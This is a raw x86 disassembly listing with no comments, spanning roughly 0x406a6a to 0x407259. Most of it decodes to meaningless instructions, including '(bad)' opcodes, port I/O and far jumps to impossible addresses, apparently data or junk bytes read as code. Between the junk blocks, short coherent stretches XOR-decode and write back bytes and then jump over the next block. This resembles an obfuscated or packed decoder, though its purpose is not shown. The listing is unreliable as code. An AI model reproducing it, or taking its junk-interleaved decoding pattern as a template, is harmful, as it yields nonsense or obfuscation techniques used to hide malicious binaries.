  406a6a:	mov    edx,0x43ec7fca
  406a6f:	xchg   ebp,eax
  406a70:	pop    es
  406a71:	push   ss
  406a72:	sbb    ch,BYTE PTR [ebp-0x2136ce77]
  406a78:	cmp    cl,BYTE PTR [edi+0x3a]
  406a7b:	imul   ebp,DWORD PTR [edx-0x23],0xffffffad
  406a7f:	enter  0xc94,0x4f
  406a83:	dec    esi
  406a84:	addr16 repnz icebp 
  406a87:	or     al,0x6b
  406a89:	mov    esi,0xbdd6b11d
  406a8e:	(bad)  
  406a90:	adc    BYTE PTR [eax-0x3c60c8a1],dl
  406a96:	leave  
  406a97:	stos   DWORD PTR es:[edi],eax
  406a98:	jb     0x406a4d
  406a9a:	(bad)  [edx]
  406a9c:	jecxz  0x406a92
  406a9e:	shr    BYTE PTR [ebx-0x7353a93d],0xb7
  406aa5:	lods   eax,DWORD PTR ds:[esi]
  406aa6:	push   cs
  406aa7:	xor    BYTE PTR [edi+0x4212dc32],bl
  406aad:	pop    edx
  406aae:	inc    ebp
  406aaf:	xor    cl,al
  406ab1:	mul    bh
  406ab3:	and    ecx,DWORD PTR [ebx-0x53]
  406ab6:	add    dl,BYTE PTR [edi+0x35]
  406ab9:	xchg   esp,eax
  406aba:	mov    ds:0x5d360bcd,al
  406abf:	lds    eax,FWORD PTR [edx]
  406ac1:	leave  
  406ac2:	xchg   ebp,eax
  406ac3:	add    eax,0x6278624a
  406ac8:	ret    0x205a
  406acb:	pop    ecx
  406acc:	dec    ebp
  406acd:	sbb    eax,0xd13eee4a
  406ad2:	mov    bh,0x46
  406ad4:	xor    DWORD PTR [edi*1+0x721325bf],eax
  406adb:	call   0xe7bbf4a0
  406ae0:	push   esi
  406ae1:	dec    edi
  406ae2:	js     0x406b5a
  406ae4:	mov    al,ds:0xc914c58
  406ae9:	fbld   TBYTE PTR [esi]
  406aeb:	add    DWORD PTR [ebx+0x614a27f2],0xffffffdb
  406af2:	outs   dx,DWORD PTR ds:[esi]
  406af3:	loope  0x406add
  406af5:	dec    esi
  406af6:	mov    ah,0xbe
  406af8:	mov    DWORD PTR [esi],edi
  406afa:	mov    eax,ebx
  406afc:	and    al,0x38
  406afe:	test   esi,esp
  406b00:	(bad)  
  406b01:	into   
  406b02:	cmp    DWORD PTR ds:0xb45fba4b,edi
  406b08:	inc    ecx
  406b09:	into   
  406b0a:	iret   
  406b0b:	xor    eax,0xdafe61f7
  406b10:	and    ecx,DWORD PTR [ebp+0x29]
  406b13:	stos   DWORD PTR es:[edi],eax
  406b14:	out    0x9e,eax
  406b16:	jo     0x406afa
  406b18:	mov    esi,0xa5382e36
  406b1d:	pop    ss
  406b1e:	jb     0x406b98
  406b20:	lods   eax,DWORD PTR ds:[esi]
  406b21:	pop    ss
  406b22:	cld    
  406b23:	jp     0x406b67
  406b25:	pop    esi
  406b26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b27:	ret    
  406b28:	inc    ebp
  406b29:	mov    eax,ds:0x2c764c93
  406b2e:	cmp    esi,DWORD PTR [eax+0x48]
  406b31:	cmp    dh,bl
  406b33:	sub    eax,DWORD PTR [ebx+0x30a6b5e7]
  406b39:	sbb    al,0xe0
  406b3b:	and    DWORD PTR [edi+0x1da40670],edi
  406b41:	sbb    bh,BYTE PTR [edx+0x2d12e2b8]
  406b47:	pop    eax
  406b48:	sub    bh,0xd5
  406b4b:	fimul  WORD PTR [ebp+0x3]
  406b4e:	shr    ecx,1
  406b50:	pop    esi
  406b51:	add    al,0x0
  406b53:	add    BYTE PTR [ebx-0x2fcc17ab],cl
  406b59:	add    edx,DWORD PTR [ebp-0x14]
  406b5c:	mov    edi,DWORD PTR [ebp-0x1c]
  406b5f:	mov    dl,BYTE PTR [edx+edi*1+0x32729f]
  406b66:	mov    BYTE PTR [ebp+0xf],dl
  406b69:	mov    edx,DWORD PTR [ebp-0xc]
  406b6c:	xor    edx,eax
  406b6e:	add    edx,DWORD PTR [ebp-0x14]
  406b71:	jmp    0x406cc3
  406b76:	mov    ah,0x9b
  406b78:	scas   al,BYTE PTR es:[edi]
  406b79:	pop    es
  406b7a:	popa   
  406b7b:	cmp    edx,DWORD PTR [ebp+0x59]
  406b7e:	(bad)  
  406b80:	xor    DWORD PTR [eax-0x58515edc],ecx
  406b86:	jecxz  0x406b8e
  406b88:	jle    0x406c08
  406b8a:	and    edi,DWORD PTR [edi+0x7e]
  406b8d:	jle    0x406bdf
  406b8f:	inc    edi
  406b90:	push   0x2d
  406b92:	ins    DWORD PTR es:[edi],dx
  406b93:	xchg   esp,eax
  406b94:	and    ebp,DWORD PTR [ecx]
  406b96:	adc    al,0x2b
  406b98:	cmp    BYTE PTR [edx],dl
  406b9a:	nop
  406b9b:	fnstcw WORD PTR [esi+0x921ec39]
  406ba1:	ret    
  406ba2:	rol    DWORD PTR [ecx+edx*4-0x5aae0bfc],cl
  406ba9:	cmp    ch,BYTE PTR [ebp-0xc]
  406bac:	inc    ecx
  406bad:	scas   al,BYTE PTR es:[edi]
  406bae:	retf   0x22
  406bb1:	jl     0x406ba5
  406bb3:	fmul   DWORD PTR [edi]
  406bb5:	aaa    
  406bb6:	not    BYTE PTR [esi-0x7d]
  406bb9:	sbb    edi,DWORD PTR [ebp-0x56fddfb4]
  406bbf:	popa   
  406bc0:	xchg   ebx,eax
  406bc1:	into   
  406bc2:	cwde   
  406bc3:	mov    ch,0x9c
  406bc5:	(bad)  
  406bc6:	outs   dx,DWORD PTR ds:[esi]
  406bc7:	xor    ah,BYTE PTR [edx+0x56]
  406bca:	xchg   ecx,eax
  406bcb:	shl    esp,1
  406bcd:	outs   dx,DWORD PTR ds:[esi]
  406bce:	aad    0x9f
  406bd0:	sub    eax,0x7fa69f69
  406bd5:	and    bl,BYTE PTR [ecx-0x62f6c688]
  406bdb:	fmul   DWORD PTR [eax+0x6b]
  406bde:	mov    es,esp
  406be0:	inc    esp
  406be1:	xchg   ecx,eax
  406be2:	adc    al,0xe9
  406be4:	out    dx,eax
  406be5:	js     0x406b8a
  406be7:	aad    0x78
  406be9:	repz inc ebp
  406beb:	dec    eax
  406bec:	outs   dx,DWORD PTR ds:[esi]
  406bed:	retf   0x6f9b
  406bf0:	and    cl,BYTE PTR [ebx-0x47]
  406bf3:	arpl   WORD PTR [edx+0x26],sp
  406bf6:	call   0xc9278a0d
  406bfb:	or     al,0x6
  406bfd:	or     eax,DWORD PTR [edi]
  406bff:	cld    
  406c00:	mov    eax,ds:0x450f61dc
  406c05:	mov    al,0x73
  406c07:	xchg   edi,eax
  406c08:	(bad)
  406c0c:	cmp    al,dl
  406c0e:	lea    eax,[esi]
  406c10:	out    0xa6,eax
  406c12:	les    esp,FWORD PTR [ebx-0x7c]
  406c15:	or     eax,0x1060e9ae
  406c1a:	cmp    al,0x17
  406c1c:	xor    eax,0xe0fe96eb
  406c21:	lock popf 
  406c23:	ins    DWORD PTR es:[edi],dx
  406c24:	aaa    
  406c25:	cmc    
  406c26:	dec    ebp
  406c27:	sub    BYTE PTR [esi],bh
  406c29:	stos   DWORD PTR es:[edi],eax
  406c2a:	dec    ebx
  406c2b:	sbb    BYTE PTR [edi+0x1bca45a3],bh
  406c31:	cwde   
  406c32:	or     DWORD PTR [ebx-0x668c47f],ebp
  406c38:	cmp    bh,BYTE PTR [ecx]
  406c3a:	push   esp
  406c3b:	lods   eax,DWORD PTR ss:[esi]
  406c3d:	mov    ds,ebp
  406c3f:	mov    bl,0x3c
  406c41:	popa   
  406c42:	mov    ecx,0x1fc569db
  406c47:	adc    al,0x22
  406c49:	cwde   
  406c4a:	pop    es
  406c4b:	in     al,0x33
  406c4d:	imul   edx,DWORD PTR gs:[edi+0x48a006be],0x7f
  406c55:	adc    al,0xeb
  406c57:	mov    ebp,DWORD PTR [edi+0x319cfddd]
  406c5d:	xchg   DWORD PTR [ebx-0x22],eax
  406c60:	sbb    al,0xf2
  406c62:	push   ebx
  406c63:	mov    eax,0x3781704c
  406c68:	and    BYTE PTR [edi+0x73],0xc0
  406c6c:	adc    eax,0xf8705c0c
  406c71:	add    al,0xfa
  406c73:	or     BYTE PTR [eax-0x1b],bh
  406c76:	imul   edx,DWORD PTR [ebx],0xfab7297c
  406c7c:	(bad)  [ebx]
  406c7e:	inc    eax
  406c7f:	test   dh,cl
  406c81:	cmp    eax,0xb66a21a9
  406c86:	xchg   ecx,eax
  406c87:	add    eax,0xa3ff8b41
  406c8c:	addr16 mov al,ds:0xde56
  406c90:	mov    esi,0x6268f27
  406c95:	mov    DWORD PTR ds:0xafb09954,0xda9406c5
  406c9f:	or     dh,BYTE PTR [esi+0x24d5338c]
  406ca5:	in     al,0xaa
  406ca7:	jb     0x406c90
  406ca9:	lahf   
  406caa:	pop    ecx
  406cab:	sti    
  406cac:	xchg   ecx,eax
  406cad:	cmp    esp,DWORD PTR [esi+ebp*4]
  406cb0:	and    ecx,DWORD PTR [eax+edi*2-0x68]
  406cb4:	fnstenv [ebx+0x6325e616]
  406cba:	idiv   DWORD PTR ds:0x5fcd8f95
  406cc0:	xor    al,0x81
  406cc2:	(bad)  
  406cc3:	mov    edi,DWORD PTR [ebp-0x1c]
  406cc6:	mov    dl,BYTE PTR [edx+edi*1+0x32729f]
  406ccd:	mov    BYTE PTR [ebp+0xb],dl
  406cd0:	mov    dl,BYTE PTR [ebp+0xf]
  406cd3:	mov    edi,DWORD PTR [ebp-0xc]
  406cd6:	xor    edi,eax
  406cd8:	add    edi,DWORD PTR [ebp-0x14]
  406cdb:	mov    ebx,DWORD PTR [ebp-0x1c]
  406cde:	jmp    0x406e30
  406ce3:	stos   DWORD PTR es:[edi],eax
  406ce4:	out    dx,eax
  406ce5:	pop    edx
  406ce6:	sbb    al,0x5a
  406ce8:	test   eax,0x2e197979
  406ced:	leave  
  406cee:	ss fsub st(6),st
  406cf1:	shl    DWORD PTR [esp+edx*4+0x237e7e07],0x7f
  406cf9:	jle    0x406d79
  406cfb:	push   esp
  406cfc:	mov    esp,0x41ccd512
  406d01:	psadbw mm4,QWORD PTR [edi*2-0x65fcfcf0]
  406d09:	jns    0x406d37
  406d0b:	jbe    0x406ca3
  406d0d:	mov    cl,0xb5
  406d0f:	rcl    BYTE PTR [eax],0xe3
  406d12:	xchg   esp,eax
  406d13:	jns    0x406d13
  406d15:	(bad)  
  406d16:	mov    ds:0x5e28bc34,al
  406d1b:	int3   
  406d1c:	push   0xffffffdc
  406d1e:	scas   al,BYTE PTR es:[edi]
  406d1f:	dec    esi
  406d20:	mov    eax,0x3989bd5d
  406d25:	jbe    0x406d35
  406d27:	out    dx,al
  406d28:	xor    eax,0x1bb4ced6
  406d2d:	pushf  
  406d2e:	retf   0xfe7e
  406d31:	add    edx,DWORD PTR [eax-0x18]
  406d34:	data16 jge 0x406d61
  406d37:	(bad)  
  406d38:	in     al,dx
  406d39:	ja     0x406cc8
  406d3b:	cmp    eax,0xdb149526
  406d40:	je     0x406cd2
  406d42:	popa   
  406d43:	(bad)  
  406d44:	jl     0x406da8
  406d46:	repz adc eax,0xa84473d9
  406d4c:	out    0x88,al
  406d4e:	and    BYTE PTR [esi],al
  406d50:	mov    edi,0xbe7e9056
  406d55:	shl    BYTE PTR ds:0x85fb108a,1
  406d5b:	xchg   ebp,eax
  406d5c:	or     ch,dl
  406d5e:	pop    es
  406d5f:	not    BYTE PTR [ebx-0x56e51a4b]
  406d65:	rol    DWORD PTR ds:0xf3ca1bbb,cl
  406d6b:	push   0x31871c4e
  406d70:	in     eax,dx
  406d71:	mov    edx,0xcf6a16fc
  406d76:	sbb    eax,0x60b35190
  406d7b:	inc    ebp
  406d7c:	and    eax,0x85d80806
  406d81:	push   edi
  406d83:	jge    0x406d12
  406d85:	fnstcw WORD PTR [ebx]
  406d87:	test   eax,ecx
  406d89:	jmp    0x508e:0x54a2b084
  406d90:	mov    esp,0x50500760
  406d95:	sar    dh,cl
  406d97:	adc    al,0x60
  406d99:	sub    cl,BYTE PTR ds:0xc4cfa112
  406d9f:	xchg   edi,eax
  406da0:	iret   
  406da1:	fwait
  406da2:	dec    ebp
  406da3:	jl     0x406d3d
  406da5:	aad    0xb2
  406da7:	jmp    esp
  406da9:	call   0xbb73:0x8f28a980
  406db0:	xchg   edi,eax
  406db1:	into   
  406db2:	mov    ds:0xd5a51675,eax
  406db7:	dec    esp
  406db8:	mov    dh,0xde
  406dba:	fwait
  406dbb:	mov    bl,0x61
  406dbd:	pop    ecx
  406dbe:	dec    eax
  406dbf:	xchg   esi,eax
  406dc0:	scas   eax,DWORD PTR es:[edi]
  406dc1:	and    bl,BYTE PTR [edi]
  406dc3:	cmp    eax,0x501d4f63
  406dc8:	and    DWORD PTR [ecx+0x52],ecx
  406dcb:	jbe    0x406e07
  406dcd:	addr16 icebp 
  406dcf:	sti    
  406dd0:	jbe    0x406dae
  406dd2:	xchg   ecx,eax
  406dd3:	in     al,0xc9
  406dd5:	jl     0x406dc3
  406dd7:	xchg   edi,eax
  406dd8:	mov    ebx,DWORD PTR [ebx]
  406dda:	mov    bl,0x70
  406ddc:	push   edx
  406ddd:	hlt    
  406dde:	sub    DWORD PTR [edi],0xffffffec
  406de1:	pop    edx
  406de2:	xor    DWORD PTR [ebx-0x9e0d685],ebx
  406de8:	test   DWORD PTR [ecx+0x49f15820],0xce792d16
  406df2:	shl    DWORD PTR [ecx],cl
  406df4:	outs   dx,DWORD PTR ds:[esi]
  406df5:	out    0x7a,eax
  406df7:	add    ah,BYTE PTR [eax*1+0x34e03383]
  406dfe:	(bad)  
  406dff:	popa   
  406e00:	mov    bl,0xb9
  406e03:	es mov esp,es
  406e06:	jb     0x406dad
  406e08:	stos   DWORD PTR es:[edi],eax
  406e09:	adc    BYTE PTR [ebx+0x2d61c1b9],cl
  406e0f:	and    BYTE PTR [ebp-0x6ee7333a],0x1f
  406e16:	jg     0x406e20
  406e18:	jle    0x406e49
  406e1a:	mul    DWORD PTR [edx+0x63]
  406e1d:	pop    edi
  406e1e:	push   0xffffffc0
  406e20:	mov    BYTE PTR [eax],0xaf
  406e23:	add    DWORD PTR [edi+0x99a879e],ecx
  406e29:	and    esp,DWORD PTR [ebx+0x62ee0369]
  406e2f:	cmc    
  406e30:	mov    BYTE PTR [edi+ebx*1+0x32729f],dl
  406e37:	jmp    0x406f89
  406e3c:	jns    0x406e62
  406e3e:	mov    dh,0xd8
  406e40:	dec    ebx
  406e41:	js     0x406ebc
  406e43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e44:	mov    BYTE PTR [esi-0x4],bl
  406e47:	lods   al,BYTE PTR ds:[esi]
  406e48:	inc    esi
  406e49:	int    0x88
  406e4b:	mov    edi,0x7e7e0459
  406e50:	and    edi,DWORD PTR [edi+0x7e]
  406e53:	jle    0x406e3e
  406e55:	lods   al,BYTE PTR ds:[esi]
  406e56:	mov    ah,0x49
  406e58:	je     0x406e6e
  406e5a:	or     al,bh
  406e5c:	mov    esi,0x8f642a58
  406e61:	lds    esi,FWORD PTR [edx+eiz*4-0x1]
  406e65:	mov    edi,0x126e0d71
  406e6a:	push   ebx
  406e6b:	mov    ebx,0xc5ffb1c4
  406e70:	mov    ebp,0x77edb835
  406e75:	daa    
  406e76:	sti    
  406e77:	jmp    0x406e4e
  406e79:	sbb    al,0xeb
  406e7b:	cmc    
  406e7c:	adc    cl,BYTE PTR [ebx]
  406e7e:	sub    dh,bl
  406e80:	out    0x1a,eax
  406e82:	fld    TBYTE PTR [ebx]
  406e84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e85:	scas   eax,DWORD PTR es:[edi]
  406e86:	cmp    eax,0xd40a4630
  406e8b:	in     al,0xe3
  406e8d:	pop    ds
  406e8e:	les    esi,FWORD PTR [eax-0x24]
  406e91:	sbb    BYTE PTR [esi],dh
  406e93:	xchg   esi,eax
  406e94:	jge    0x406e5e
  406e96:	push   ebp
  406e97:	fst    QWORD PTR ds:[edx+0x3c1625a1]
  406e9e:	cmc    
  406e9f:	pop    eax
  406ea0:	dec    sp
  406ea2:	xchg   DWORD PTR [edx-0x24],ebx
  406ea5:	iret   
  406ea6:	xor    DWORD PTR [eax-0x2c46d6a1],eax
  406eac:	add    BYTE PTR [eax+0x16dd707f],dl
  406eb2:	push   es
  406eb3:	xchg   edx,eax
  406eb4:	push   esp
  406eb5:	int3   
  406eb6:	cmp    DWORD PTR [ebx-0x3f8d014e],ebx
  406ebc:	mov    esi,0xce6e78e3
  406ec1:	bound  ebx,QWORD PTR [ebx+edi*8+0x542034f9]
  406ec8:	mov    edx,0x3cf6ebe0
  406ecd:	or     edi,edx
  406ecf:	inc    eax
  406ed0:	imul   ebp,DWORD PTR [ecx-0x5e4c6bdd],0x3b661285
  406eda:	mov    ecx,0x47e2cc0d
  406edf:	scas   eax,DWORD PTR es:[edi]
  406ee0:	into   
  406ee1:	and    DWORD PTR [esi],ebx
  406ee3:	adc    al,0x63
  406ee5:	cli    
  406ee6:	pop    ss
  406ee7:	fisttp WORD PTR [ecx+eax*8]
  406eea:	push   ebx
  406eeb:	dec    ecx
  406eec:	cmp    al,0x28
  406eee:	dec    edx
  406eef:	push   ds
  406ef0:	xor    DWORD PTR [esi+0x3b],eax
  406ef3:	xchg   DWORD PTR [esi],esp
  406ef5:	enter  0x2fda,0x69
  406ef9:	std    
  406efa:	mov    ecx,0xfc12d126
  406eff:	rcr    cl,cl
  406f01:	xor    al,0xaa
  406f03:	repnz ror edx,1
  406f06:	mov    ds:0xae37497,eax
  406f0b:	retf   
  406f0c:	adc    edx,esi
  406f0e:	adc    eax,DWORD PTR [eax]
  406f10:	sbb    dh,BYTE PTR [bp+di-0x751b]
  406f15:	fidiv  WORD PTR [edi+0x34]
  406f18:	pop    ss
  406f19:	fiadd  WORD PTR [edi+0x6b00d908]
  406f1f:	out    0x12,al
  406f21:	jg     0x406f7b
  406f23:	addr16 mov bh,0x36
  406f26:	cld    
  406f27:	adc    al,0x8
  406f29:	dec    esp
  406f2a:	xor    eax,0x70c47256
  406f2f:	or     al,BYTE PTR [ecx+eax*4+0x64eaf020]
  406f36:	cmp    eax,0x423bdfcb
  406f3b:	aad    0x18
  406f3d:	stos   BYTE PTR es:[edi],al
  406f3e:	jle    0x406f02
  406f40:	xor    DWORD PTR [esi],esi
  406f42:	xchg   ecx,eax
  406f43:	dec    eax
  406f44:	push   ecx
  406f45:	xor    bh,BYTE PTR [esi+0x6755e8a1]
  406f4b:	leave  
  406f4c:	and    al,0x33
  406f4e:	dec    ebx
  406f4f:	(bad)  
  406f51:	fbstp  TBYTE PTR [ecx-0x11]
  406f54:	fisub  DWORD PTR [edx+0x3b8d1f4d]
  406f5a:	jb     0x406ee5
  406f5c:	hlt    
  406f5d:	ror    BYTE PTR [ebx+eiz*8],0xba
  406f61:	jo     0x406f0a
  406f63:	bound  ebx,QWORD PTR [eax-0x69fa4405]
  406f69:	jae    0x406fbc
  406f6b:	pop    esi
  406f6c:	packsswb mm7,QWORD PTR [eax]
  406f6f:	mov    ebp,0x5430cf77
  406f74:	out    0x52,al
  406f76:	inc    ebp
  406f77:	inc    ebx
  406f78:	sbb    ah,cl
  406f7a:	push   0xc25625a1
  406f7f:	lds    esp,FWORD PTR [esi]
  406f81:	ret    0xbb15
  406f84:	xchg   BYTE PTR [esp+eiz*4+0x558af2e2],bl
  406f8b:	or     ecx,DWORD PTR [ebx-0x7cc1783]
  406f91:	add    edi,DWORD PTR [ebp-0x14]
  406f94:	mov    ebx,DWORD PTR [ebp-0x1c]
  406f97:	mov    BYTE PTR [edi+ebx*1+0x32729f],dl
  406f9e:	mov    edx,DWORD PTR [ebp-0x44]
  406fa1:	mov    edi,DWORD PTR [ebp-0xc]
  406fa4:	xor    edx,eax
  406fa6:	xor    edi,eax
  406fa8:	add    edx,ecx
  406faa:	add    edi,ecx
  406fac:	imul   edx,edi
  406faf:	add    edx,DWORD PTR [ebp-0x14]
  406fb2:	mov    DWORD PTR [ebp-0x14],edx
  406fb5:	mov    edx,DWORD PTR [ebp-0xc]
  406fb8:	mov    edi,DWORD PTR [ebp-0x24]
  406fbb:	xor    edx,eax
  406fbd:	add    edx,ecx
  406fbf:	imul   edx,edi
  406fc2:	mov    edi,DWORD PTR [ebp-0xc]
  406fc5:	xor    edi,eax
  406fc7:	sub    edx,edi
  406fc9:	mov    edi,DWORD PTR [ebp-0xc]
  406fcc:	mov    ebx,DWORD PTR [ebp-0x14]
  406fcf:	xor    edi,eax
  406fd1:	add    edi,ecx
  406fd3:	imul   edi,ebx
  406fd6:	mov    ebx,DWORD PTR [ebp-0x18]
  406fd9:	xor    ebx,eax
  406fdb:	sub    edx,ecx
  406fdd:	lea    edi,[edi+ebx*1+0x32729f]
  406fe4:	cmp    edi,edx
  406fe6:	jbe    0x406b54
  406fec:	mov    edx,DWORD PTR [ebp-0xc]
  406fef:	mov    edi,DWORD PTR [ebp-0x24]
  406ff2:	xor    edx,eax
  406ff4:	add    edx,ecx
  406ff6:	imul   edx,edi
  406ff9:	mov    edi,DWORD PTR [ebp-0x18]
  406ffc:	xor    edi,eax
  406ffe:	jmp    0x407150
  407003:	hlt    
  407004:	jae    0x40702b
  407006:	pop    ds
  407007:	mov    ecx,0xa4a98439
  40700c:	pushf  
  40700d:	sbb    al,0x11
  40700f:	push   eax
  407010:	add    dl,BYTE PTR [esi+esi*1+0x7e7e1a02]
  407017:	and    edi,DWORD PTR [edi+0x7e]
  40701a:	jle    0x407021
  40701c:	inc    ecx
  40701d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40701e:	inc    ecx
  40701f:	inc    eax
  407020:	sbb    edi,DWORD PTR [ecx+0x78d6aeb8]
  407026:	shl    esp,0xb8
  407029:	cmp    al,0xf0
  40702b:	cmp    cl,BYTE PTR ds:0x33f645ea
  407031:	lods   eax,DWORD PTR ds:[esi]
  407032:	jbe    0x4070a0
  407034:	lods   eax,DWORD PTR ds:[esi]
  407035:	mov    dl,0xd3
  407037:	outs   dx,DWORD PTR ds:[esi]
  407038:	das    
  407039:	neg    BYTE PTR [edi]
  40703b:	je     0x407082
  40703d:	add    eax,DWORD PTR [edi+0x74]
  407040:	std    
  407041:	inc    edx
  407042:	sti    
  407043:	adc    DWORD PTR [ecx+0x2f776f4f],0x21
  40704a:	test   DWORD PTR ds:0xf0d57f05,eax
  407050:	and    BYTE PTR [ebx+eiz*1+0x26789a58],0x74
  407058:	jl     0x4070b1
  40705a:	pop    ebx
  40705b:	and    eax,0x2a1a83ab
  407060:	stos   BYTE PTR es:[edi],al
  407061:	enter  0x229f,0x6d
  407065:	cld    
  407066:	aad    0x45
  407068:	xor    eax,DWORD PTR [ebx+eax*2]
  40706b:	sbb    ch,BYTE PTR [ecx]
  40706d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40706e:	pop    edi
  40706f:	pop    ss
  407070:	sub    esi,DWORD PTR ds:0xe421d686
  407076:	xor    DWORD PTR [eax+ebp*1-0x77f189db],ebp
  40707d:	(bad)  
  40707e:	or     eax,0x9a41f3d6
  407083:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407084:	mov    bl,0x29
  407086:	outs   dx,BYTE PTR ds:[esi]
  407087:	mov    ah,0x81
  407089:	mov    ds:0x40efa1e6,eax
  40708e:	jmp    0x8145:0xf2fefdf
  407095:	jmp    0x8279b51c
  40709a:	jmp    0xcc8a:0x40a88a29
  4070a1:	push   ds
  4070a2:	imul   BYTE PTR [ecx]
  4070a4:	bound  esi,QWORD PTR [edi]
  4070a6:	sbb    eax,0x4524cb68
  4070ab:	imul   ebp,DWORD PTR [edx],0xb279d9e3
  4070b1:	(bad)
  4070b4:	loopne 0x40710d
  4070b6:	nop
  4070b7:	push   esi
  4070b8:	inc    esi
  4070b9:	jne    0x4070ec
  4070bb:	and    bl,bh
  4070bd:	push   eax
  4070be:	inc    edi
  4070bf:	mov    BYTE PTR ds:0xf5d8b293,0x89
  4070c6:	into   
  4070c7:	mov    esi,0xa8158fc7
  4070cc:	mov    edx,0x3d0e384c
  4070d1:	and    ecx,esp
  4070d3:	and    ch,al
  4070d5:	inc    edx
  4070d6:	gs dec eax
  4070d8:	xor    al,0x4f
  4070da:	sub    edx,DWORD PTR [edi+0x3b002d60]
  4070e0:	sar    DWORD PTR [edi-0x26],1
  4070e3:	push   esp
  4070e4:	and    ah,ah
  4070e6:	cdq    
  4070e7:	test   DWORD PTR [esi+0x58],edx
  4070ea:	cmp    BYTE PTR [edi+0x34],dl
  4070ed:	inc    ebp
  4070ee:	pop    ebx
  4070ef:	pop    edi
  4070f0:	pop    ebx
  4070f1:	fldcw  WORD PTR [eax+eiz*2-0x2a]
  4070f5:	mov    edx,0x280c7985
  4070fa:	mov    BYTE PTR [esi-0x42b99ec5],dh
  407100:	aas    
  407101:	lea    edx,[esi]
  407103:	loope  0x40708b
  407105:	mov    ds:0x679bcd94,al
  40710a:	lahf   
  40710b:	data16 cmp al,0x62
  40710e:	ds sub bh,al
  407111:	add    dl,BYTE PTR [edx+edi*8]
  407114:	clc    
  407115:	push   esi
  407116:	div    BYTE PTR [edi]
  407118:	lock push esi
  40711a:	and    al,0xbc
  40711c:	sbb    al,0x78
  40711e:	mov    eax,ds:0x54d562e0
  407123:	retf   0x2dda
  407126:	inc    ecx
  407127:	rcl    BYTE PTR [ebp-0x72c54832],cl
  40712d:	int    0x67
  40712f:	or     eax,0x8ccd3334
  407134:	pop    ecx
  407135:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407136:	pop    esi
  407137:	enter  0x6e76,0x5c
  40713b:	inc    esp
  40713c:	fnsave [esi]
  40713e:	ds pop edx
  407140:	stos   BYTE PTR es:[edi],al
  407141:	or     BYTE PTR ds:0xe523bce2,0xaa
  407148:	jo     0x407142
  40714a:	ins    DWORD PTR es:[edi],dx
  40714b:	xor    al,0xef
  40714d:	loope  0x40716e
  40714f:	inc    esp
  407150:	add    edx,edi
  407152:	mov    edi,DWORD PTR [ebp-0x8]
  407155:	lea    edx,[edx+edi*1+0x32729f]
  40715c:	mov    DWORD PTR [ebp-0x8],edx
  40715f:	mov    edx,DWORD PTR [ebp-0x20]
  407162:	xor    edx,eax
  407164:	mov    edi,0xffcd8d61
  407169:	sub    edi,edx
  40716b:	add    edi,DWORD PTR [ebp-0x10]
  40716e:	jmp    0x4072c0
  407173:	sub    ebp,DWORD PTR [edi+0x59798f79]
  407179:	jmp    0x9398b939
  40717e:	sub    al,0xff
  407180:	scas   eax,DWORD PTR es:[edi]
  407181:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407182:	addr16 aaa 
  407184:	sbb    edi,DWORD PTR [esi+0x7e]
  407187:	and    edi,DWORD PTR [edi+0x7e]
  40718a:	jle    0x407205
  40718c:	adc    ecx,edi
  40718e:	mov    al,ds:0x21ead838
  407193:	sbb    eax,0xcc58126c
  407198:	dec    ecx
  407199:	popa   
  40719a:	dec    ebx
  40719b:	sbb    ah,BYTE PTR [ebx-0x6ea0004a]
  4071a1:	mov    ebp,ebp
  4071a3:	or     al,0x1f
  4071a5:	lea    ebx,[ebp-0x67718d2a]
  4071ab:	mov    bh,0x8
  4071ad:	dec    ebx
  4071ae:	mov    ah,0x4c
  4071b0:	stos   BYTE PTR es:[edi],al
  4071b1:	fs cld 
  4071b3:	add    esi,edi
  4071b5:	test   BYTE PTR [eax+0x35927a43],ah
  4071bb:	sbb    BYTE PTR [edx+0x40],0x84
  4071bf:	adc    ebp,DWORD PTR [edx+0x57]
  4071c2:	push   ebp
  4071c3:	iret   
  4071c4:	jns    0x407212
  4071c6:	lods   al,BYTE PTR ds:[esi]
  4071c7:	pop    esp
  4071c8:	push   esp
  4071c9:	xchg   ecx,eax
  4071ca:	es out 0x48,eax
  4071cd:	loope  0x407238
  4071cf:	fsubrp st(7),st
  4071d1:	into   
  4071d2:	aad    0x5e
  4071d4:	dec    eax
  4071d5:	pop    ebx
  4071d6:	push   ds
  4071d7:	sub    ah,bh
  4071d9:	jmp    0xabacc1e1
  4071de:	fisttp WORD PTR [ecx+0x275a977e]
  4071e4:	add    ah,BYTE PTR [edi-0x6c]
  4071e7:	push   ss
  4071e8:	cdq    
  4071e9:	xor    eax,0xc505686e
  4071ee:	pop    edx
  4071ef:	mov    al,ds:0x9b505ece
  4071f4:	jno    0x40725b
  4071f6:	scas   eax,DWORD PTR es:[edi]
  4071f7:	rcl    bh,0x51
  4071fa:	(bad)  
  4071fb:	jae    0x4071e7
  4071fd:	xor    al,0x2c
  4071ff:	dec    edi
  407200:	or     DWORD PTR [eax-0x6b],ecx
  407203:	push   cs
  407204:	dec    ebp
  407205:	fild   QWORD PTR [esi]
  407207:	adc    eax,DWORD PTR [ebp-0x46acabc7]
  40720d:	mov    ebp,0x99affcb1
  407212:	mov    ecx,DWORD PTR [ecx+0xc]
  407215:	in     al,0xe8
  407217:	mov    ch,0x29
  407219:	call   0xa440:0x153549f9
  407220:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407221:	(bad)  
  407223:	out    dx,al
  407224:	cs ds xchg edx,esi
  407228:	mov    BYTE PTR [esi],dh
  40722a:	push   ecx
  40722b:	mov    fs,edx
  40722d:	stos   BYTE PTR es:[edi],al
  40722e:	or     ch,BYTE PTR [edx]
  407230:	les    edi,FWORD PTR [esp+edx*2-0x3b]
  407234:	adc    ebp,DWORD PTR [esi]
  407236:	test   al,0x2d
  407238:	aaa    
  407239:	enter  0x1fa2,0x87
  40723d:	cmp    edx,0x57e3ba61
  407243:	mov    ds:0xd072eb7c,eax
  407248:	mov    ds:0xbe49378f,al
  40724d:	push   esi
  40724e:	rcl    DWORD PTR [edx-0x7911a98f],cl
  407254:	sub    eax,0xbd3d519
  407259:	test   BYTE PTR [ecx],cl
